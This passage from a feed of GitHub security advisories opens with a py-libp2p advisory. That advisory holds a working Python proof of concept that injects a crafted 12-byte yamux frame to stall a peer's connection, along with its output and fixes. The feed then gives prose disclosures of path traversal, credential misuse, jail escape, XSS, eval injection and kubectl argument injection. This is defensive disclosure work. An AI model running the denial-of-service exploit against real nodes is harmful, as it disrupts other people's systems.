    return struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, 0, stream_id, HUGE_LENGTH)


def _get_yamux(host, peer_id) -&gt; Yamux | None:
    swarm = host.get_network()
    conns = swarm.connections.get(peer_id)
    if conns is None:
        return None
    conn = conns[0] if isinstance(conns, list) else conns
    mc = conn.muxed_conn
    return mc if isinstance(mc, Yamux) else None


async def attack():
    proc = psutil.Process(os.getpid())
    rss0 = proc.memory_info().rss

    v_kp = create_new_key_pair(secrets.token_bytes(32))
    a_kp = create_new_key_pair(secrets.token_bytes(32))

    # DEFAULT new_host() — noise + yamux — no explicit sec_opt or muxer_opt
    victim = new_host(key_pair=v_kp)
    attacker = new_host(key_pair=a_kp)

    victim.set_stream_handler(PING, lambda s: s.close())

    async with victim.run(listen_addrs=[LOOPBACK]):
        vaddr = victim.get_addrs()[0]
        assert "127.0.0.1" in str(vaddr), "SAFETY: non-loopback"
        print(f"[*] Victim   : {vaddr}")
        print(f"[*] Config   : DEFAULT (noise + yamux)")

        async with attacker.run(listen_addrs=[LOOPBACK]):
            await attacker.connect(PeerInfo(victim.get_id(), victim.get_addrs()))
            await trio.sleep(0.2)

            a_yamux = _get_yamux(attacker, victim.get_id())
            v_yamux = _get_yamux(victim, attacker.get_id())
            assert a_yamux and v_yamux, "yamux muxed_conn not found"
            print(
                f"[*] Muxer    : attacker={type(a_yamux).__name__}, "
                f"victim={type(v_yamux).__name__}"
            )

            # --- Pre-attack: confirm yamux is healthy ---
            pre_stream = await attacker.new_stream(victim.get_id(), [PING])
            await pre_stream.close()
            print("[*] Pre-attack ping: OK (yamux live)")

            # --- Inject malicious frame ---
            frame = craft_malicious_frame(stream_id=1)
            print(
                f"[*] Injecting {len(frame)}-byte yamux frame: "
                f"type=DATA flags=0x0 stream_id=1 length={HUGE_LENGTH:#010x} "
                f"({HUGE_LENGTH:,} bytes)"
            )
            print(f"[*] Frame hex: {frame.hex()}")

            # Write directly to the noise-encrypted secure conn.
            # secured_conn.write() encrypts before sending; victim decrypts and
            # sees the raw yamux frame bytes, which handle_incoming processes.
            await a_yamux.secured_conn.write(frame)
            await trio.sleep(0.2)
            # Victim's handle_incoming has now read the 12-byte header, dispatched
            # to `elif typ == TYPE_DATA:`, and entered read_exactly(conn, 4GB).

            # --- Post-attack: try to use yamux ---
            post_attack_succeeded = False

            with trio.move_on_after(3.0):
                try:
                    post_stream = await attacker.new_stream(victim.get_id(), [PING])
                    await post_stream.close()
                    post_attack_succeeded = True
                except Exception as e:
                    print(f"[*] Post-attack new_stream error: {type(e).__name__}: {e}")

            gc.collect()
            rss1 = proc.memory_info().rss

            print("\n=== RESULTS ===")
            print(f"Injected frame (hex) : {frame.hex()}")
            print(
                f"Body-length field    : {HUGE_LENGTH} bytes requested, 0 bytes sent"
            )
            print(f"Post-attack ping OK  : {post_attack_succeeded}")
            print(f"RSS delta            : {(rss1 - rss0) / 1024:.1f} KiB")

            yamux_stuck = not post_attack_succeeded
            print(f"\nVictim yamux loop stuck: {yamux_stuck}")

            if yamux_stuck:
                print(
                    "[CONFIRMED] handle_incoming blocked - victim yamux dead for "
                    "this connection."
                )
                print(
                    "[IMPACT   ] Single 12-byte write from any authenticated peer "
                    "(post-noise-handshake)\n"
                    "            permanently stalls yamux for that connection.\n"
                    "            Affects DEFAULT new_host() config - no mplex required.\n"
                    "            No timeout, no max-length check, no exception."
                )
            else:
                print("[NOT CONFIRMED] yamux responded post-attack.")

            assert yamux_stuck, (
                "Expected yamux to be stuck after injecting malicious DATA frame, "
                "but connection remained functional."
            )


def test_yamux_data_frame_stall():
    trio.run(attack)


if __name__ == "__main__":
    trio.run(attack)
</code></pre>
<pre><code>python3 -m pytest test_poc.py::test_yamux_data_frame_stall -v
</code></pre>
<p>Malicious frame (12 bytes, hex): <code>00000000000000 01ffffffff</code></p>
<pre><code>version  = 0x00
type     = 0x00  (DATA)
flags    = 0x0000
stream_id= 0x00000001
length   = 0xFFFFFFFF  (4,294,967,295 bytes)
</code></pre>
<p>Output:</p>
<pre><code>[*] Config   : DEFAULT (noise + yamux)
[*] Pre-attack ping: OK (yamux live)
[*] Injecting 12-byte yamux frame: type=DATA flags=0x0 stream_id=1 length=0xffffffff
Victim yamux loop stuck: True
[CONFIRMED] handle_incoming blocked - victim yamux dead for this connection.
PASSED in ~3.8s
</code></pre>
<h3 id="impact">Impact</h3>
<p>A single authenticated peer (one that has completed the noise handshake, which requires no credentials) can permanently freeze the yamux read loop for a given connection using 12 bytes of payload. All streams on that connection stop working. No exception is raised, no log entry is written, and no automatic recovery occurs.</p>
<p>This applies to the default <code>new_host()</code> configuration. Unlike a similar issue in the mplex muxer (which requires an explicit opt-in), every py-libp2p node using the standard setup is affected. At the default connection limit of 10,000 connections, an attacker running 10,000 peers can freeze all connections using roughly 120 KB of total traffic.</p>
<p>There is no confidentiality or integrity impact. The effect is limited to availability on the targeted yamux connection.</p>
<h3 id="remediation">Remediation</h3>
<p><strong>1. Enforce the receive window on inbound DATA frames</strong> (primary fix)
Before calling <code>read_exactly</code>, reject frames whose declared length exceeds the negotiated receive window:</p>
<pre><code class="language-python"># libp2p/stream_muxer/yamux/yamux.py
                                                                                                           
MAX_YAMUX_FRAME = 256 * 1024  # matches DEFAULT_WINDOW_SIZE and go-yamux default
                                                     
elif typ == TYPE_DATA:
    if length &gt; MAX_YAMUX_FRAME:
        logger.warning(
            f"yamux: oversized DATA frame length={length} &gt; {MAX_YAMUX_FRAME}, sending RST"
        )
        rst_header = struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, FLAG_RST, stream_id, 0)
        await self.secured_conn.write(rst_header)
        continue  # skip body read; loop processes next frame
    data = await read_exactly(self.secured_conn, length) if length &gt; 0 else b""
</code></pre>
<p>The same check should be applied to the SYN branch at lines 804 to 806.</p>
<p><strong>2. Add a per-frame timeout in <code>handle_incoming()</code></strong></p>
<pre><code class="language-python">while not self.event_shutting_down.is_set():
    try:
        with trio.fail_after(60):
            header = await read_exactly(self.secured_conn, HEADER_SIZE)
            ...
    except trio.TooSlowError:
        logger.warning("yamux: frame read timed out, closing connection")
        self.event_shutting_down.set()
        break
</code></pre>
<p>Option 1 eliminates the amplification entirely. Option 2 bounds the worst-case stall duration for any future oversized-read path that might be introduced.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573">https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573</a></li>
<li><a href="https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37">https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37</a></li>
<li><a href="https://github.com/advisories/GHSA-hmj8-5xmh-5573">https://github.com/advisories/GHSA-hmj8-5xmh-5573</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmj8-5xmh-5573</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:37:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[atomic-agents-stack] atomic-agents-stack: Dashboard HTTP server path traversal allows arbitrary file read]]></title>
        <id>https://github.com/advisories/GHSA-rm43-82j9-r4mj</id>
        <link href="https://github.com/advisories/GHSA-rm43-82j9-r4mj"/>
        <updated>2026-08-13T14:17:14.000Z</updated>
        <content type="html"><![CDATA[<p>The optional dashboard HTTP server (<code>atomic_agents/dashboard/serve.py</code>) builds filesystem paths directly from the request path and serves them without a containment check. It is the only per-request untrusted-path site in the codebase that does not route through <code>_io.safe_resolve_under</code>. Literal <code>../</code> segments survive <code>urlparse</code> and <code>Path</code> joining, so a request can read files outside the intended <code>agents_root</code> (including via the static branch).</p>
<p><strong>Impact:</strong> arbitrary file read. The default bind is loopback, but <code>--host</code> is an operator-settable documented flag; binding <code>0.0.0.0</code> exposes this to the LAN. Even on loopback it is reachable via DNS-rebinding from a browser or SSRF from a co-located service.</p>
<p><strong>Affected:</strong> <code>dashboard/serve.py</code> (<code>DashboardHandler.do_GET</code> / <code>_serve_file</code>), all versions through 1.0.0.</p>
<p><strong>Fix:</strong> route every served path through <code>_io.safe_resolve_under</code> against the intended root and return 404 on <code>PathTraversalError</code>; reject <code>..</code>/separators early; optionally refuse a non-loopback <code>--host</code> unless an explicit auth/allow flag is set (matching <code>serve/_app.py</code>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-rm43-82j9-r4mj">https://github.com/dep0we/atomic-agents-stack/security/advisories/GHSA-rm43-82j9-r4mj</a></li>
<li><a href="https://github.com/dep0we/atomic-agents-stack/commit/ec474f458122c5c0ca718d0df3078c8080338b2c">https://github.com/dep0we/atomic-agents-stack/commit/ec474f458122c5c0ca718d0df3078c8080338b2c</a></li>
<li><a href="https://github.com/advisories/GHSA-rm43-82j9-r4mj">https://github.com/advisories/GHSA-rm43-82j9-r4mj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rm43-82j9-r4mj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-13T14:17:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
        <updated>2026-08-13T14:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
<h3 id="details">Details</h3>
<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
<h3 id="impact">Impact</h3>
<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-13T14:16:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
        <updated>2026-08-13T14:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
<h3 id="details">Details</h3>
<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
<h3 id="impact">Impact</h3>
<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-13T14:16:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai-slim] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
        <updated>2026-08-13T14:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
<h3 id="details">Details</h3>
<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
<h3 id="impact">Impact</h3>
<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-13T14:16:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai-slim] Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials]]></title>
        <id>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</id>
        <link href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w"/>
        <updated>2026-08-13T14:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.</p>
<h3 id="details">Details</h3>
<p>UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File <strong>URL</strong> parts are validated against a scheme allowlist before being forwarded, but <code>UploadedFile</code> references — which point to a file by provider file ID or cloud-storage URI (e.g. <code>s3://…</code>, <code>gs://…</code>) — were forwarded without validation.</p>
<p>Because the provider resolves an <code>UploadedFile</code> using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen <code>UploadedFile</code> can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.</p>
<h3 id="impact">Impact</h3>
<p>Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>1.106.0</code> (1.x) or <code>2.0.0b6</code> (the 2.x beta line), which validate <code>UploadedFile</code> references on client-submitted messages the same way file URLs are validated.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip <code>UploadedFile</code> parts from incoming messages before running the agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54249">https://nvd.nist.gov/vuln/detail/CVE-2026-54249</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.106.0</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6">https://github.com/pydantic/pydantic-ai/releases/tag/v2.0.0b6</a></li>
<li><a href="https://github.com/advisories/GHSA-h7p7-w5gc-xj3w">https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7p7-w5gc-xj3w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-13T14:16:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-jailexec] Ansible FreeBSD Jail Connection Plugin: Jail escape via symlink following in put_file (host-side root mv)]]></title>
        <id>https://github.com/advisories/GHSA-cxgv-hp74-jj7r</id>
        <link href="https://github.com/advisories/GHSA-cxgv-hp74-jj7r"/>
        <updated>2026-08-13T15:58:54.000Z</updated>
        <content type="html"><![CDATA[<p>Through version 1.3.0, the jailexec connection plugin's put_file resolved a transfer's destination to a path on the jail host ( + ) and ran mkdir -p and mv there as root on the host. Those commands follow symbolic links, and the path was operated on outside the jail, so a symlink existing inside the jail was followed by the host-side, root-privileged mv.</p>
<p>A party controlling content inside a managed jail (the jail's root, or any process able to create a symlink in a directory an Ansible task later writes to) can therefore cause an arbitrary root-owned write on the host, outside the jail — a full jail escape. Arbitrary root-owned host writes are readily escalated to host compromise (e.g. cron, rc.d, authorized_keys).</p>
<p>Preconditions: the operator runs a copy/template/fetch-style task (anything using put_file) against the jail, and the attacker can place a symlink inside the jail at or above the task's destination before the transfer runs.</p>
<p>Patches: Fixed in 2.0.0. File transfers now run inside the jail via jexec (mkdir -p </p><dir> &amp;&amp; cat &gt;  for put_file; cat &lt;  for fetch_file), so every path resolves within the jail's chroot. An in-jail symlink can at most redirect within the same jail and can no longer reach the host.<p></p>
<p>Workarounds: None in affected versions; upgrade to 2.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/chofstede/ansible_jailexec/security/advisories/GHSA-cxgv-hp74-jj7r">https://github.com/chofstede/ansible_jailexec/security/advisories/GHSA-cxgv-hp74-jj7r</a></li>
<li><a href="https://github.com/chofstede/ansible_jailexec/commit/6e80eecb2db7aebd1258fded6ae5c3aba1dd4123">https://github.com/chofstede/ansible_jailexec/commit/6e80eecb2db7aebd1258fded6ae5c3aba1dd4123</a></li>
<li><a href="https://github.com/advisories/GHSA-cxgv-hp74-jj7r">https://github.com/advisories/GHSA-cxgv-hp74-jj7r</a></li>
</ul>
</dir>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxgv-hp74-jj7r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-12T23:21:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tablib] tablib: Stored XSS in the HTML export via unescaped dataset title]]></title>
        <id>https://github.com/advisories/GHSA-gqgw-jghv-mxwx</id>
        <link href="https://github.com/advisories/GHSA-gqgw-jghv-mxwx"/>
        <updated>2026-08-12T19:32:21.000Z</updated>
        <content type="html"><![CDATA[<p>tablib prior to 3.10.0 contains a stored cross-site scripting vulnerability in the HTML export functionality that allows attackers to execute arbitrary JavaScript by embedding malicious payloads in dataset titles, which are interpolated unsanitized into HTML output via the export_book method in the _html.py format handler. Attackers can rename worksheet sheets in imported files such as XLSX, ODS, XLS, or YAML with script payloads that are assigned to the Dataset title attribute and rendered unescaped inside an HTML h3 tag, leading to session hijacking, unauthorized administrative actions, and sensitive data exposure when the output is rendered in a browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9318">https://nvd.nist.gov/vuln/detail/CVE-2026-9318</a></li>
<li><a href="https://github.com/jazzband/tablib/pull/668">https://github.com/jazzband/tablib/pull/668</a></li>
<li><a href="https://github.com/jazzband/tablib">https://github.com/jazzband/tablib</a></li>
<li><a href="https://github.com/jazzband/tablib/releases/tag/v3.10.0">https://github.com/jazzband/tablib/releases/tag/v3.10.0</a></li>
<li><a href="https://www.vulncheck.com/advisories/tablib-versions-prior-to-stored-xss-via-html-export-dataset-title">https://www.vulncheck.com/advisories/tablib-versions-prior-to-stored-xss-via-html-export-dataset-title</a></li>
<li><a href="https://github.com/advisories/GHSA-gqgw-jghv-mxwx">https://github.com/advisories/GHSA-gqgw-jghv-mxwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gqgw-jghv-mxwx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-12T03:31:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK vulnerable to Eval Injection via collocations CLI arguments]]></title>
        <id>https://github.com/advisories/GHSA-848c-c2cx-j7qx</id>
        <link href="https://github.com/advisories/GHSA-848c-c2cx-j7qx"/>
        <updated>2026-08-12T19:30:22.000Z</updated>
        <content type="html"><![CDATA[<p>NLTK (Natural Language Toolkit) before version 3.9.3 contains an eval injection vulnerability in the nltk.collocations module that allows an attacker who controls command-line arguments to execute arbitrary Python code. When collocations.py is invoked directly, the <strong>main</strong> block passes command-line arguments directly to eval() as suffixes of BigramAssocMeasures without allowlist validation or sanitization, enabling an attacker to supply a Python expression that escapes the intended attribute lookup and executes arbitrary code including OS commands via the os module.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71408">https://nvd.nist.gov/vuln/detail/CVE-2025-71408</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3465">https://github.com/nltk/nltk/pull/3465</a></li>
<li><a href="https://github.com/nltk/nltk/commit/66f14096d952ec8f04934f515e027534bd4eb0ac">https://github.com/nltk/nltk/commit/66f14096d952ec8f04934f515e027534bd4eb0ac</a></li>
<li><a href="https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval">https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval</a></li>
<li><a href="https://github.com/nltk/nltk/releases/tag/3.9.3">https://github.com/nltk/nltk/releases/tag/3.9.3</a></li>
<li><a href="https://www.vulncheck.com/advisories/nltk-eval-injection-via-collocations-py-command-line-arguments">https://www.vulncheck.com/advisories/nltk-eval-injection-via-collocations-py-command-line-arguments</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3657.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3657.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-848c-c2cx-j7qx">https://github.com/advisories/GHSA-848c-c2cx-j7qx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-848c-c2cx-j7qx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-25T00:31:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-server-kubernetes] mcp-server-kubernetes argument injection can expose Kubernetes cluster credentials]]></title>
        <id>https://github.com/advisories/GHSA-wmg3-h8mf-wgvr</id>
        <link href="https://github.com/advisories/GHSA-wmg3-h8mf-wgvr"/>
        <updated>2026-08-12T19:26:55.000Z</updated>
        <content type="html"><![CDATA[<p>MCP Server Kubernetes before 3.9.0 contains an argument injection vulnerability in structured tools (kubectl_get, kubectl_describe, kubectl_delete) that allows attackers to bypass the assertNoDangerousFlags security check by supplying resourceType and name parameters with leading dashes. Attackers can inject the --server flag to redirect kubectl commands to an attacker-controlled API server, causing the operator's bearer token to be transmitted externally and enabling full cluster compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61459">https://nvd.nist.gov/vuln/detail/CVE-2026-61459</a></li>
<li><a href="https://github.com/Flux159/mcp-server-kubernetes/issues/328">https://github.com/Flux159/mcp-server-kubernetes/issues/328</a></li>
<li><a href="https://github.com/Flux159/mcp-server-kubernetes/pull/329">https://github.com/Flux159/mcp-server-kubernetes/pull/329</a></li>
<li><a href="https://github.com/Flux159/mcp-server-kubernetes/commit/d7890f50a4567bf5d9842541ba6f41e180227f9a">https://github.com/Flux159/mcp-server-kubernetes/commit/d7890f50a4567bf5d9842541ba6f41e180227f9a</a></li>
<li><a href="https://github.com/Flux159/mcp-server-kubernetes/releases/tag/3.9.0">https://github.com/Flux159/mcp-server-kubernetes/releases/tag/3.9.0</a></li>
<li><a href="https://www.vulncheck.com/advisories/mcp-server-kubernetes-argument-injection-via-kubectl-structured-tools">https://www.vulncheck.com/advisories/mcp-server-kubernetes-argument-injection-via-kubectl-structured-tools</a></li>
<li><a href="https://github.com/advisories/GHSA-wmg3-h8mf-wgvr">https://github.com/advisories/GHSA-wmg3-h8mf-wgvr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmg3-h8mf-wgvr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-10T21:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] apache-airflow DAG source authorization bypass exposes co-located DAG source]]></title>
        <id>https://github.com/advisories/GHSA-4fh7-7jx4-8f6c</id>
        <link href="https://github.com/advisories/GHSA-4fh7-7jx4-8f6c"/>
        <updated>2026-08-12T19:23:54.000Z</updated>
